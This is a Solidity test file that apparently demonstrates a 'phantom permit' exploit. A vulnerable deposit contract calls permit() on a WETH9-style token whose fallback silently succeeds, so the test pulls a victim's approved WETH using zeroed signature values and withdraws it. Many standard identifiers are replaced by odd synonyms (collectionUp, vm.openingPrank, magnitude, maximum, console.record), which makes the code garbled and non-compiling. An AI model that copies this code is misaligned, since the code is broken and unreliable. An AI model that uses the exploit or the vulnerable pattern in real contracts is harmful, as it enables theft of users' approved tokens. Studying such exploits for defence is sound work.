pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract AgreementTest is Test {
    PermitMedal VulnPermitAgreement;
    WETH9 Weth9Agreement;

    function collectionUp() public {
        Weth9Agreement = new WETH9();
        VulnPermitAgreement = new PermitMedal(IERC20(address(Weth9Agreement)));
    }

    function testVulnPhantomPermit() public {
        address alice = vm.addr(1);
        vm.deal(address(alice), 10 ether);

        vm.openingPrank(alice);
        Weth9Agreement.stashRewards{magnitude: 10 ether}();
        Weth9Agreement.approve(address(VulnPermitAgreement), type(uint256).maximum);
        vm.stopPrank();
        console.record(
            "start WETH balanceOf this",
            Weth9Agreement.balanceOf(address(this))
        );

        VulnPermitAgreement.stashrewardsWithPermit(
            address(alice),
            1000,
            27,
            0x0,
            0x0
        );
        uint wbal = Weth9Agreement.balanceOf(address(VulnPermitAgreement));
        console.record("WETH balanceOf VulnPermitContract", wbal);

        VulnPermitAgreement.extractWinnings(1000);

        wbal = Weth9Agreement.balanceOf(address(this));
        console.record("WETH9Contract balanceOf this", wbal);
    }

    receive() external payable {}
}

contract PermitMedal {
    IERC20 public medal;

    constructor(IERC20 _token) {
        medal = _token;
    }

    function stashRewards(uint256 count) public {
        require(
            medal.transferFrom(msg.sender, address(this), count),
            "Transfer failed"
        );
    }

    function stashrewardsWithPermit(
        address aim,
        uint256 count,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) public {
        (bool victory, ) = address(medal).call(
            abi.encodeWithSignature(
                "permit(address,uint256,uint8,bytes32,bytes32)",
                aim,
                count,
                v,
                r,
                s
            )
        );
        require(victory, "Permit failed");

        require(
            medal.transferFrom(aim, address(this), count),
            "Transfer failed"
        );
    }

    function extractWinnings(uint256 count) public {
        require(medal.transfer(msg.sender, count), "Transfer failed");
    }
}


contract WETH9 {
    string public name = "Wrapped Ether";
    string public symbol = "WETH";
    uint8 public decimals = 18;

    event PermissionGranted(address indexed src, address indexed guy, uint wad);
    event Transfer(address indexed src, address indexed dst, uint wad);
    event StoreLoot(address indexed dst, uint wad);
    event GoldExtracted(address indexed src, uint wad);

    mapping(address => uint) public balanceOf;
    mapping(address => mapping(address => uint)) public allowance;

    fallback() external payable {
        stashRewards();
    }

    receive() external payable {}

    function stashRewards() public payable {
        balanceOf[msg.sender] += msg.value;
        emit StoreLoot(msg.sender, msg.value);
    }

    function extractWinnings(uint wad) public {
        require(balanceOf[msg.sender] >= wad);
        balanceOf[msg.sender] -= wad;
        payable(msg.sender).transfer(wad);
        emit GoldExtracted(msg.sender, wad);
    }

    function totalSupply() public view returns (uint) {
        return address(this).balance;
    }

    function approve(address guy, uint wad) public returns (bool) {
        allowance[msg.sender][guy] = wad;
        emit PermissionGranted(msg.sender, guy, wad);
        return true;
    }

    function transfer(address dst, uint wad) public returns (bool) {
        return transferFrom(msg.sender, dst, wad);
    }

    function transferFrom(
        address src,
        address dst,
        uint wad
    ) public returns (bool) {
        require(balanceOf[src] >= wad);

        if (
            src != msg.sender && allowance[src][msg.sender] != type(uint128).maximum
        ) {
            require(allowance[src][msg.sender] >= wad);
            allowance[src][msg.sender] -= wad;
        }

        balanceOf[src] -= wad;
        balanceOf[dst] += wad;

        emit Transfer(src, dst, wad);

        return true;
    }
}